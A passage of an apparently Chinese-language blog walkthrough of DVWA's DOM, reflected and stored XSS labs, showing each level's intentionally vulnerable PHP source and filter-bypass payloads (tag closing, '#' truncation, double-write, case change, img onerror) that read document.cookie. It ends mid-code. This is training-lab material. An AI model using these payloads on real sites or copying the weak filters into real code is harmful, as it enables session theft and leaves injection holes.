<h3 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>medium难度的首先对传入的default变量进行了检查，看是否存在，如果存在的话就查看其内容是否包含<code>&lt;script</code>字符串，如果包含该字符串的话就将URL后面的参数修改为<code>?default=English</code></p>
<p>攻击方法：</p>
<h4 id="1、闭合option标签再注入"><a href="#1、闭合option标签再注入" class="headerlink" title="1、闭合option标签再注入"></a>1、闭合option标签再注入</h4><p>闭合<code>&lt;/option&gt;</code>和<code>&lt;/select&gt;</code>，然后使用<code>img</code>标签通过事件来弹窗</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;English&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;&#39;x&#39; onerror&#x3D;alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226104815983.png" alt="image-20210226104815983"></p>
<h4 id="2、利用参数"><a href="#2、利用参数" class="headerlink" title="2、利用参数"></a>2、利用参数</h4><p>因为在网页端是截取 url ，而服务器读的是也只是 default 这个变量，那我们可以传一个不是default的参数进去即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;English&amp;&amp;script&#x3D;&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226105453910.png" alt="image-20210226105453910"></p>
<h4 id="3、利用-截断"><a href="#3、利用-截断" class="headerlink" title="3、利用#截断"></a>3、利用#截断</h4><p>由于URL中 <code>#</code> 字符后面的内容是不会被发送到后端的，因此可以绕过后端的检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;English#&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226105719071.png" alt="image-20210226105719071"></p>
<h4 id="4、使用input标签"><a href="#4、使用input标签" class="headerlink" title="4、使用input标签"></a>4、使用input标签</h4><p>使用input标签一样可以弹窗</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;English&lt;input onclick&#x3D;alert(&#39;XSS&#39;) &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>页面加载完成后，点击input输入框就会触发点击事件弹窗</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226112145534.png" alt="image-20210226112145534"></p>
<h3 id="High-9"><a href="#High-9" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>high难度下对传进来的default参数进行了限制，当只有是指定的4种字符才能够输出，否则就设置为默认英文。但是这种显示和medium难度的几乎没有区别，仅仅是对传进来的default做了检查，当我们传的不是default参数，或者根本没有传参数的时候无效。这里只演示使用 <code>#</code>截断的方法。使用 <code>&amp;&amp;</code> 传两个参数同理。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226112332244.png" alt="image-20210226112332244"></p>
<h3 id="Impossible-9"><a href="#Impossible-9" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;vulnerable_code_area&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> 		<span class="tag">&lt;<span class="name">p</span>&gt;</span>Please choose a language:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">					<span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">						<span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">						<span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + (lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span></span><br><span class="line"><span class="handlebars"><span class="xml">						document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;&#x27;</span> <span class="attr">disabled</span>=<span class="string">&#x27;disabled&#x27;</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">					&#125;</span><br><span class="line">					    </span><br><span class="line"><span class="handlebars"><span class="xml">					document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">					document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">					document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">					document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span></span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Select&quot;</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Impossible 难度直接不对我们的输入参数进行 URL 解码了，这样会导致标签失效，从而无法XSS。</p>
<h2 id="XSS-Reflected-反射型跨站脚本"><a href="#XSS-Reflected-反射型跨站脚本" class="headerlink" title="XSS (Reflected) 反射型跨站脚本"></a>XSS (Reflected) 反射型跨站脚本</h2><h3 id="Low-10"><a href="#Low-10" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>X-XSS-Protection</strong>：是Chrome 和 Safari 的一项功能，可在检测到反射的跨站点脚本XSS攻击时阻止页面加载。</p>
<p>​    0: 禁止XSS过滤.</p>
<p>​    1: 启用 XSS 过滤（通常在浏览器中默认）：如果检测到跨站点脚本攻击，浏览器将清理页面（删除不安全的部分）。</p>
<p>low难度把浏览器的XSS保护设置关闭了，并且对输出的name参数不做任何检查就输出。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226113524070.png" alt="image-20210226113524070"></p>
<h3 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>medium难度过滤掉了 <code>&lt;script&gt;</code> 标签，绕过的方法很多：</p>
<h4 id="1、双写绕过"><a href="#1、双写绕过" class="headerlink" title="1、双写绕过"></a>1、双写绕过</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226113944901.png" alt="image-20210226113944901"></p>
<h4 id="2、使用其他标签"><a href="#2、使用其他标签" class="headerlink" title="2、使用其他标签"></a>2、使用其他标签</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&#39;x&#39; onerror&#x3D;alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226114039334.png" alt="image-20210226114039334"></p>
<h4 id="3、大小写绕过"><a href="#3、大小写绕过" class="headerlink" title="3、大小写绕过"></a>3、大小写绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(document.cookie)&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226114133929.png" alt="image-20210226114133929"></p>
<h3 id="High-10"><a href="#High-10" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>high难度的过滤规则完善了些，不区分大小写并且不能使用双写，那么我们仍可以使用其他标签进行来达到效果。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&#39;x&#39; onerror&#x3D;alert(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226114538410.png" alt="image-20210226114538410"></p>
<h3 id="Impossible-10"><a href="#Impossible-10" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>htmlspecialchars()</strong> ： 将特殊字符转换为 HTML 实体</p>
<p>impossible难度下加入了token防止CSRF攻击，还使用了htmlspecialchar函数对输入的特殊字符转化为HTML实体，也就是我们输入的HTML标签都不会被解析，因此不会构成XSS攻击。</p>
<h2 id="XSS-Stored-存储型跨站脚本"><a href="#XSS-Stored-存储型跨站脚本" class="headerlink" title="XSS (Stored) 存储型跨站脚本"></a>XSS (Stored) 存储型跨站脚本</h2><h3 id="Low-11"><a href="#Low-11" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>**trim(string,charlist)**：函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p>
<p>**stripslashes(string)**：函数删除字符串中的反斜杠<code>\</code>。</p>
<p>**mysql_real_escape_string(string,connection)**：函数会对字符串中的特殊符号（\x00，\n，\r，\，’，”，\x1a）进行转义。</p>
<p>low难度下，对输入的内容没有做任何检查，直接存储在数据库中。利用方法：直接在message栏中输入：（在name栏同理，但是在前端对输入的字数做了限制，只需在页面审查元素那里把长度限制去除后在输入提交即可）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226151224778.png" alt="image-20210226151224778"></p>
<p>每一次成功后记得重置一下数据库，否则每次刷新都会弹窗。</p>
<h3 id="Medium-9"><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>strip_tags()</strong> ：函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<code>&lt;b&gt;</code>标签。</p>
<p>**addslashes()**：函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p>
<p><strong>htmlspecialchars()</strong> ： 将特殊字符转换为 HTML 实体</p>
<p>medium难度下，对massage做了严格的检查限制，去除了HTML标签之后又把HTML标签实体化，导致无法从message进行XSS攻击，但是对name变量的检查仅仅是把<code>&lt;script&gt;</code>标签替换为空字符，容易被绕过：</p>
<p>1、双写绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210226152230984.png" alt="image-20210226152230984"></p>
<p>2、大小写绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;SCRIPT&gt;alert(document.cookie)&lt;&#x2F;SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<p>3、使用其他标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(&#39;XSS&#39;)&gt;</span><br></pre></td></tr></table></figure>


<h3 id="High-11"><a href="#High-11" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : 